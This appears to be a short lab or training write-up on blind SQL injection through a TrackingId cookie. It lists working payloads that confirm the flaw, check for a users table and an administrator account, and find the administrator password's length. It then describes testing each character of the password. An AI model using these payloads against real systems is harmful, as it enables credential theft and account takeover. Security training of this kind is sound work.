**Modify the CheckingID cookie to confirm the vulnerability**

```
TrackingId=xyz' AND '1'='1
```

and 

```
TrackingId=xyz' AND '1'='2
```

to see if there is a different response

**Confirming that there is a table called *users***

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**Confirming that there is a user called administrator**

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Determine how many characters are in the administrator password**

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

**After determining the length of the password, he next step is to test the character at each position to determine its value**

